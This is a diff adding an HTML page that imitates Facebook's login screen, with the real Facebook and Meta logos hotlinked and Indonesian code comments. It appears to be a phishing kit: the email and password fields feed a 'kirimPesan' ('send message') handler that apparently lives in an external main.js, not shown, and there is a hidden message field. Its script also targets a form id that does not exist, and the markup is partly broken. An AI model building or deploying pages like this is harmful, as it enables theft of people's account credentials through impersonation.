@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Facebook</title>
+  
+  <style>
+    /* Reset dasar */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    /* Container utama */
+    .container {
+      width: 100%;
+      max-width: 360px;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    /* Header */
+    .header h1 {
+      color: #1877f2;
+      font-size: 36px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    /* Form group */
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 4px rgba(24, 119, 242, 0.5);
+    }
+
+    /* Tombol login */
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    .login-button:hover {
+      background-color: #145db2;
+    }
+
+    /* Link lupa password */
+    .forgot-link {
+      margin-top: 15px;
+    }
+
+    .forgot-link a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .forgot-link a:hover {
+      text-decoration: underline;
+    }
+
+    /* Divider (garis pembatas) */
+    .divider {
+      margin: 20px 0;
+      position: relative;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      height: 1px;
+      width: 40%;
+      background: #ddd;
+      position: absolute;
+      top: 50%;
+    }
+
+    .divider::before {
+      left: 0;
+    }
+
+    .divider::after {
+      right: 0;
+    }
+
+    .divider span {
+      background: white;
+      padding: 0 10px;
+      color: #606770;
+      font-size: 14px;
+    }
+
+    /* Tombol buat akun baru */
+    .create-account {
+      width: 100%;
+      background-color: #42b72a;
+      color: white;
+      font-size: 16px;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    .create-account:hover {
+      background-color: #36a420;
+    }
+
+    /* Indikator loading */
+    .loading {
+      display: none;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #606770;
+    }
+
+    .loading span {
+      display: inline-block;
+      margin-left: 5px;
+      animation: blink 1.5s infinite;
+    }
+
+    .loading span:nth-child(2) {
+      animation-delay: 0.5s;
+    }
+
+    .loading span:nth-child(3) {
+      animation-delay: 1s;
+    }
+
+    @keyframes blink {
+      0%, 100% {
+        opacity: 0;
+      }
+      50% {
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+  	<span data-bloks-name="bk.components.TextSpan" style="color: rgb(70, 90, 105); font-weight: 400; display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; white-space: pre-wrap; overflow-wrap: break-word;">English (United States)</span>
+    <div class="header">
+      <h1><img data-bloks-name="bk.components.Image" role="heading" alt="Facebook dari Meta" class="wbloks_1" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;"></h1>
+      <h1>facebook</h1>
+    </div>
+<div class="form-group">
+    <form>
+        <input type="text" id="nama" placeholder="Email or phone number" required=""/>
+        </div>
+      <div class="form-group">
+        <input type="text" id="email" placeholder="Password" />
+        <input type="text" style="display: none;" id="pesan" placeholder="Pesan"/>
+        <p style="display: none;">This text is hidden.</p>
+        
+        <input type="submit" class="login-button" id="kirim" value="Log in" onclick="kirimPesan()" />
+    </form>
+<div class="loading" id="loading">
+      Processing<span>.</span><span>.</span><span>.</span>
+      </div>
+    <div class="forgot-link">
+      <a href="#">Forgotten password?</a>
+    </div>
+    <div class="divider">
+      <span></span>
+    </div>
+    <button class="create-account">Create New Account</button>
+    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none; flex-grow: 1; flex-shrink: 1e+06; padding-bottom: 0px; flex-direction: column; justify-content: flex-end;"><div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none; padding-top: 20px; padding-bottom: 20px; align-items: center; justify-content: center;"><div class="wbloks_1" style="height: 12px; aspect-ratio: 5 / 1;"><div data-bloks-name="bk.components.AspectRatio" class="wbloks_115"><img data-bloks-name="bk.components.Image" alt="Meta logo" class="wbloks_1" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" style="height: 100%; width: 100%; pointer-events: inherit; mask-image: url(&quot;https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png&quot;); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;"></div></div></div><div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none; align-items: center; flex-direction: column; justify-content: center;"><div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none;">
+  </div>
+
+  <script>
+  	
+    // Menangani submit form
+    const loginForm = document.getElementById('login-form');
+    const loadingIndicator = document.getElementById('loading');
+
+    loginForm.addEventListener('submit', function (e) {
+      // Mencegah submit langsung
+      e.preventDefault();
+
+      // Menampilkan loading
+      loadingIndicator.style.display = 'block';
+
+      // Simulasi loading selama 2 detik sebelum melanjutkan
+      setTimeout(() => {
+        loginForm.submit();
+      }, 2000);
+    });
+  </script>
+</body>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="main.js"></script>
+
+</html>
